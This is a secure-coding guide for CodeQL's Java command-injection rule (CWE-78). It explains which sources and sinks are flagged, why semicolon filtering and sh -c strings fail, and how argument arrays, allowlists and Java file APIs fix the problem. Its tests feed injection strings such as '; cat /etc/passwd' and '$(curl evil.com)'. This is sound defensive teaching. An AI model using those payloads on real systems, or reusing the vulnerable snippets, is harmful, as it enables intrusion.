# CWE-78 — OS Command Injection

## CodeQL Query Details

| Attribute | Value |
|-----------|-------|
| **Rule IDs** | `java/command-line-injection`, `java/concatenated-command-line`, `java/relative-path-command` |
| **Query files** | [`CWE-078/ExecUnescaped.ql`](https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-078/ExecUnescaped.ql) |
| **Kind** | `path-problem` |
| **Precision** | `high` |
| **Security severity** | `9.8` (Critical) |
| **OWASP** | A03:2021 Injection |

---

## What CodeQL Is Detecting

CodeQL tracks user input flowing into OS command execution sinks.

**Sources:**
- `HttpServletRequest.getParameter()`, `@RequestParam`, `@PathVariable`
- Any string derived from HTTP input through concatenation or formatting

**Sinks flagged:**
- `Runtime.getRuntime().exec(tainted)` — single string form
- `Runtime.getRuntime().exec(new String[]{"sh", "-c", tainted})`
- `new ProcessBuilder(tainted)` — where tainted ends up in the command
- `ProcessBuilder(List.of("sh", "-c", tainted))`

**What it does NOT flag:**
- `ProcessBuilder` with fixed command array and validated args passed as separate elements
- Java API alternatives (`Files.list()`, `Files.copy()`) that avoid shelling out entirely

---

## Why Naive Fixes Fail

```java
// ❌ FAILS — filtering semicolons misses many injection vectors
String safe = userInput.replace(";", "");
Runtime.getRuntime().exec("ls " + safe); // && || | $() backticks still work

// ❌ FAILS — single-string exec with sh -c is always injectable
String[] cmd = {"sh", "-c", "process " + userInput};
Runtime.getRuntime().exec(cmd); // userInput can still inject with && or |

// ❌ FAILS — quoting the argument in a shell string doesn't help
Runtime.getRuntime().exec("tool --arg '" + userInput + "'"); // ' in input escapes
```

---

## Fix Patterns

### Use Argument Array — No Shell Interpolation

```java
// ✅ GOOD — each argument is a separate element, no shell interpretation
ProcessBuilder pb = new ProcessBuilder(
    "/usr/bin/ffmpeg",
    "-i", inputFile,       // validated separately
    "-o", outputFile       // validated separately
);
pb.directory(new File("/safe/workdir"));
pb.redirectErrorStream(true);
Process process = pb.start();

// Read output safely
try (BufferedReader reader = new BufferedReader(
        new InputStreamReader(process.getInputStream()))) {
    reader.lines().forEach(line -> log.info("output: {}", line));
}
int exitCode = process.waitFor();
```

### Validate Inputs Before Passing to ProcessBuilder

```java
// ✅ GOOD — strict allowlist validation before use in command
public void processFile(String filename) throws IOException, InterruptedException {
    // Validate filename — only allow safe characters
    if (!filename.matches("[a-zA-Z0-9._-]+")) {
        throw new IllegalArgumentException("Invalid filename: " + filename);
    }

    // Verify the file exists within a known safe directory
    Path safePath = Paths.get("/app/input").resolve(filename).normalize();
    if (!safePath.startsWith(Paths.get("/app/input"))) {
        throw new SecurityException("Path traversal detected");
    }

    // Use argument array — filename is a separate argument, never shell-interpolated
    ProcessBuilder pb = new ProcessBuilder(
        "/usr/local/bin/processor",
        "--input", safePath.toString(),
        "--output", "/app/output/" + filename + ".out"
    );
    pb.redirectErrorStream(true);
    Process p = pb.start();
    p.waitFor(30, TimeUnit.SECONDS);
}
```

### Replace Shell Commands with Java API

```java
// ✅ BEST — use Java APIs instead of shelling out entirely

// Instead of: Runtime.exec("ls -la " + dir)
Files.list(Paths.get(dir))
     .filter(Files::isRegularFile)
     .forEach(p -> log.info("{} {} bytes",
         p.getFileName(), p.toFile().length()));

// Instead of: Runtime.exec("cp " + src + " " + dst)
Files.copy(Paths.get(src), Paths.get(dst), StandardCopyOption.REPLACE_EXISTING);

// Instead of: Runtime.exec("rm " + file)
Files.deleteIfExists(Paths.get(file));

// Instead of: Runtime.exec("mkdir -p " + dir)
Files.createDirectories(Paths.get(dir));

// Instead of: Runtime.exec("grep " + pattern + " " + file)
Files.lines(Paths.get(file))
     .filter(line -> line.contains(pattern)) // validated pattern
     .forEach(log::info);
```

### When Shell Is Truly Required — Strict Allowlist

```java
// ✅ ACCEPTABLE — when external tool has no Java equivalent
private static final Set<String> ALLOWED_OPERATIONS = Set.of("compress", "validate", "scan");

public void runTool(String operation, String targetFile) throws Exception {
    // Strict allowlist for the operation parameter
    if (!ALLOWED_OPERATIONS.contains(operation)) {
        throw new IllegalArgumentException("Operation not permitted: " + operation);
    }

    // Strict validation for the file parameter
    if (!targetFile.matches("[a-zA-Z0-9._-]+")) {
        throw new IllegalArgumentException("Invalid filename");
    }

    // Fixed command with validated args as separate elements
    ProcessBuilder pb = new ProcessBuilder(
        "/usr/local/bin/security-tool",
        "--operation", operation,   // from allowlist
        "--target", targetFile      // validated
    );
    // Never: new ProcessBuilder("sh", "-c", "security-tool " + operation + " " + targetFile)
}
```

---

## Security Tests

```java
@Test
void shouldBlockCommandInjection() {
    assertThrows(IllegalArgumentException.class, () ->
        toolService.processFile("file.txt; cat /etc/passwd")
    );
    assertThrows(IllegalArgumentException.class, () ->
        toolService.processFile("file.txt && whoami")
    );
    assertThrows(IllegalArgumentException.class, () ->
        toolService.processFile("$(curl evil.com)")
    );
}

@Test
void shouldAllowValidFilename() {
    assertDoesNotThrow(() -> toolService.processFile("report-2024.pdf"));
    assertDoesNotThrow(() -> toolService.processFile("data_export.csv"));
}
```

---

## References

| Resource | URL |
|----------|-----|
| CodeQL command injection query | https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-078/ExecUnescaped.ql |
| CodeQL query help | https://codeql.github.com/codeql-query-help/java/java-command-line-injection/ |
| OWASP Command Injection | https://owasp.org/www-community/attacks/Command_Injection |
| OWASP OS Command Injection Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html |
| CWE-78 | https://cwe.mitre.org/data/definitions/78.html |
